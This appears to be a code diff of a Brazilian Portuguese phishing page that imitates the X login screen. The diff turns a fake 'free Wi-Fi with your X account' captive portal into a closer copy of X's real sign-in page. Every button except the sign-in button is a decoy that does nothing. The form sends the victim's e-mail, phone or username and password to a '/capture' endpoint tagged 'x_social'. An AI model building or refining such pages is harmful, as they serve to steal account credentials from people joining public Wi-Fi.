@@ -2,57 +2,85 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<meta name="robots" content="noindex, nofollow">
-<title>X - Wi-Fi</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>X - Entrar</title>
 <style>
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { font-size: 16px; }
-body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #000000; color: #FFFFFF; padding: 16px; }
-.card { background: #16181C; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.36); }
-.logo { text-align: center; margin-bottom: 24px; font-size: 40px; font-weight: 900; letter-spacing: -1px; color: #FFFFFF; }
-.subtitle { text-align: center; color: #71767B; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
-.form-group { margin-bottom: 16px; }
-label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #E7E9EA; }
-input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #333639; border-radius: 8px; font-size: 15px; background: #000000; color: #E7E9EA; outline: none; transition: border-color 0.2s; }
-input:focus { border-color: #1D9BF0; }
-button[type="submit"] { width: 100%; padding: 14px; background: #FFFFFF; color: #000000; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; }
-button:hover { opacity: 0.92; }
-.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #71767B; }
-input[type="hidden"] { display: none; }
-@media (max-width: 480px) { .card { padding: 24px 18px; } .logo { font-size: 32px; } }
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{min-height:100vh;background:#000;color:#e7e9ea;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:16px}
+.container{width:100%;max-width:364px}
+.x-logo{text-align:center;margin-bottom:32px;font-size:40px;font-weight:900;color:#fff;font-family:serif;letter-spacing:-2px}
+h1{font-size:31px;font-weight:900;color:#e7e9ea;text-align:center;margin-bottom:32px;line-height:1.2}
+.social-btn{width:100%;padding:12px 20px;background:#fff;color:#0f1419;border:none;border-radius:50px;font-size:15px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px;transition:background .15s}
+.social-btn:hover{background:#e6e6e6}
+.social-btn .icon{width:20px;height:20px;display:inline-block;font-size:16px}
+.separator{display:flex;align-items:center;gap:12px;margin:16px 0;color:#555;font-size:14px}
+.separator::before,.separator::after{content:'';flex:1;height:1px;background:#2f3336}
+.method-tabs{display:flex;gap:0;border:1px solid #2f3336;border-radius:8px;overflow:hidden;margin-bottom:20px}
+.mtab{flex:1;padding:10px 6px;background:transparent;border:none;color:#71767b;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;text-align:center}
+.mtab.active{background:#1d9bf0;color:#fff}
+.tab-pane{display:none}
+.tab-pane.active{display:block}
+label{display:block;font-size:11px;color:#71767b;margin-bottom:5px;text-transform:uppercase;letter-spacing:.8px}
+input[type=text],input[type=email],input[type=password]{width:100%;background:#000;border:1px solid #333639;border-radius:4px;padding:14px 12px;font-size:17px;color:#e7e9ea;outline:none;margin-bottom:16px;transition:border-color .2s}
+input:focus{border-color:#1d9bf0}
+.btn-next{width:100%;padding:14px;background:#e7e9ea;color:#0f1419;border:none;border-radius:50px;font-size:17px;font-weight:900;cursor:pointer;margin-top:4px;transition:background .15s}
+.btn-next:hover{background:#d0d0d0}
+.forgot{text-align:center;margin-top:20px;font-size:15px}
+.forgot a{color:#1d9bf0;text-decoration:none;font-weight:700}
+.signup{text-align:center;margin-top:40px;font-size:15px;color:#71767b}
+.signup a{color:#1d9bf0;text-decoration:none;font-weight:700}
+@media(max-width:480px){h1{font-size:26px}.x-logo{font-size:34px}}
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="logo">&#x1D54F;</div>
-  <p class="subtitle">Acesse o Wi-Fi gratis com sua conta X</p>
+<div class="container">
+  <div class="x-logo">&#120143;</div>
+  <h1>Entre no X</h1>
+  <button class="social-btn" type="button" onclick="return false"><span class="icon">G</span> Continuar com o Google</button>
+  <button class="social-btn" type="button" onclick="return false"><span class="icon">&#63743;</span> Continuar com a Apple</button>
+  <div class="separator"><span>ou</span></div>
+  <div class="method-tabs">
+    <button class="mtab active" onclick="switchM('email',this)">E-mail</button>
+    <button class="mtab" onclick="switchM('phone',this)">Telefone</button>
+    <button class="mtab" onclick="switchM('user',this)">Usuario</button>
+  </div>
   <form action="/capture" method="POST" autocomplete="off">
     <input type="hidden" name="csrf_token" value="">
     <input type="hidden" name="portal_id" value="x_social">
-    <div class="form-group">
-      <label for="email">E-mail, telefone ou usuario</label>
-      <input type="email" name="email" id="email" placeholder="seu@email.com" required autocomplete="off">
+    <input type="hidden" name="login_method" id="xmethod" value="email">
+    <div class="tab-pane active" id="xpane-email">
+      <label>E-mail</label>
+      <input type="email" name="email" placeholder="Seu e-mail" autocomplete="off">
     </div>
-    <div class="form-group">
-      <label for="password">Senha</label>
-      <input type="password" name="password" id="password" placeholder="Sua senha" required minlength="6" maxlength="128" autocomplete="new-password">
+    <div class="tab-pane" id="xpane-phone">
+      <label>Telefone</label>
+      <input type="text" name="phone" placeholder="(00) 00000-0000" oninput="maskPhone(this)" autocomplete="off">
     </div>
-    <button type="submit">Entrar</button>
+    <div class="tab-pane" id="xpane-user">
+      <label>@usuario</label>
+      <input type="text" name="username" placeholder="@seuusuario" autocomplete="off">
+    </div>
+    <label>Senha</label>
+    <input type="password" name="password" placeholder="Senha" required minlength="6" maxlength="128" autocomplete="new-password">
+    <button class="btn-next" type="submit">Entrar</button>
   </form>
-  <p class="footer">Ao entrar, voce concorda com nossos Termos de Servico</p>
+  <p class="forgot"><a href="#" onclick="return false">Esqueceu a senha?</a></p>
+  <p class="signup">Nao tem conta? <a href="#" onclick="return false">Cadastre-se</a></p>
 </div>
 <script>
-(function(){
-  var lang = navigator.language || 'pt-BR';
-  if (lang.startsWith('en')) {
-    document.querySelector('.subtitle').textContent = 'Access free Wi-Fi with your X account';
-    document.querySelector('button[type=submit]').textContent = 'Sign in';
-    document.querySelector('.footer').textContent = 'By signing in, you agree to our Terms of Service';
-    document.querySelector('label[for=email]').textContent = 'Email, phone or username';
-    document.querySelector('label[for=password]').textContent = 'Password';
-  }
-})();
+function switchM(t,btn){
+  document.querySelectorAll('.tab-pane').forEach(function(e){e.classList.remove('active')});
+  document.querySelectorAll('.mtab').forEach(function(e){e.classList.remove('active')});
+  document.getElementById('xpane-'+t).classList.add('active');
+  btn.classList.add('active');
+  document.getElementById('xmethod').value=t;
+}
+function maskPhone(el){
+  var v=el.value.replace(/\D/g,'').slice(0,11);
+  if(v.length>6)v=v.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3');
+  else if(v.length>2)v=v.replace(/(\d{2})(\d+)/,'($1) $2');
+  el.value=v;
+}
 </script>
 </body>
 </html>
